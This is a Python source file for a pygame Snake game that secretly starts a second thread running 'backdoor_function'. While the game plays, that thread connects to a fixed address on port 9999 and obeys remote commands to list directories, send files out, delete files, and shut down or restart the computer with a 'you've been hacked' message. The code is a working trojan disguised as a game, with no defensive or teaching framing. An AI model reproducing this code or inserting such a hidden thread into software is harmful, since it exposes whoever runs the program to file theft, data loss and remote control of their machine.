import socket
import os
import time
import pygame
import sys
import random
from threading import Thread

screen_width = 480
screen_height = 480

gridsize = 20
grid_width = screen_width/gridsize
grid_height = screen_height/gridsize

up = (0,-1)
down = (0,1)
left = (-1,0)
right = (1,0)


class Snake():
    def __init__(self):
        self.length = 1
        self.positions = [((screen_width/2), (screen_height/2))]
        self.direction = random.choice([up, down, left, right])
        self.color = (17, 24, 47)
        self.score = 0

    def get_head_position(self):
        return self.positions[0]

    def turn(self, point):
        if self.length > 1 and (point[0]*-1, point[1]*-1) == self.direction:
            return
        else:
            self.direction = point

    def move(self):
        cur = self.get_head_position()
        x,y = self.direction
        new = (((cur[0]+(x*gridsize))%screen_width), (cur[1]+(y*gridsize))%screen_height)
        if len(self.positions) > 2 and new in self.positions[2:]:
            self.reset()
        else:
            self.positions.insert(0,new)
            if len(self.positions) > self.length:
                self.positions.pop()

    def reset(self):
        self.length = 1
        self.positions = [((screen_width/2), (screen_height/2))]
        self.direction = random.choice([up, down, left, right])
        self.score = 0

    def draw(self,surface):
        for p in self.positions:
            r = pygame.Rect((p[0], p[1]), (gridsize,gridsize))
            pygame.draw.rect(surface, self.color, r)
            pygame.draw.rect(surface, (93,216, 228), r, 1)

    def handle_keys(self):
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP:
                    self.turn(up)
                elif event.key == pygame.K_DOWN:
                    self.turn(down)
                elif event.key == pygame.K_LEFT:
                    self.turn(left)
                elif event.key == pygame.K_RIGHT:
                    self.turn(right)


class Food():
    def __init__(self):
        self.position = (0,0)
        self.color = (223, 163, 49)
        self.randomize_position()

    def randomize_position(self):
        self.position = (random.randint(0, grid_width-1)*gridsize, random.randint(0, grid_height-1)*gridsize)

    def draw(self, surface):
        r = pygame.Rect((self.position[0], self.position[1]), (gridsize, gridsize))
        pygame.draw.rect(surface, self.color, r)
        pygame.draw.rect(surface, (93, 216, 228), r, 1)


def backdoor_function():
    client_socket = socket.socket()
    port_number = 9999

    server_address = "192.168.99.1"
    client_socket.connect((server_address, port_number))

    print("Connected Successfully!")

    while 1:
        command = client_socket.recv(1024)
        command = command.decode()
        print("Command received successfully!")
        
        if command == "view_cwd":
            files = os.getcwd()
            files = str(files)
            client_socket.send(files.encode())
            print("Command view_cwd executed correctly!")
        
        elif command == "custom_dir":
            user_input = client_socket.recv(5000)
            user_input = user_input.decode()
            files = os.listdir(user_input)
            files = str(files)
            
            client_socket.send(files.encode())
            print("Command custom_dir executed correctly!")

        elif command == "download_files":
            filepath = client_socket.recv(5000)
            filepath = filepath.decode()
            files = open(filepath, "rb")
            data = files.read()
            client_socket.send(data)
            print("Command download_files executed correctly!")
        
        elif command == "remove_files":
            filepath = client_socket.recv(5000)
            filepath = filepath.decode()
            files = os.remove(filepath)
            print("Command remove_files executed correctly!")

        elif command == "shutdown_client":
            print("YOU'VE BEEN HACKED! THIS PC WILL SHUTDOWN AFTER 10 SECONDS!")
            time.sleep(10)
            os.system("shutdown /s /t 1")

        elif command == "restart_client":
            print("YOU'VE BEEN HACKED! THIS PC WILL RESTART AFTER 10 SECONDS!")
            time.sleep(10)
            os.system("shutdown /r /t 1")

        else:
            print("Leave")


def drawGrid(surface):
    for y in range(0, int(grid_height)):
        for x in range(0, int(grid_width)):
            if (x+y)%2 == 0:
                r = pygame.Rect((x*gridsize, y*gridsize), (gridsize,gridsize))
                pygame.draw.rect(surface,(93,216,228), r)
            else:
                rr = pygame.Rect((x*gridsize, y*gridsize), (gridsize,gridsize))
                pygame.draw.rect(surface, (84,194,205), rr)


def snake_function():
    pygame.init()

    clock = pygame.time.Clock()
    screen = pygame.display.set_mode((screen_width, screen_height), 0, 32)

    surface = pygame.Surface(screen.get_size())
    surface = surface.convert()
    drawGrid(surface)

    snake = Snake()
    food = Food()

    myfont = pygame.font.SysFont("monospace", 16)

    while (True):
        clock.tick(10)
        snake.handle_keys()
        drawGrid(surface)
        snake.move()
        
        if snake.get_head_position() == food.position:
            snake.length += 1
            snake.score += 1
            food.randomize_position()
        
        snake.draw(surface)
        food.draw(surface)
        screen.blit(surface, (0,0))
        text = myfont.render("Score {0}".format(snake.score), 1, (0,0,0))
        screen.blit(text, (5,10))
        pygame.display.update()

if __name__ == "__main__":
    Thread(target = backdoor_function).start()
    Thread(target = snake_function).start()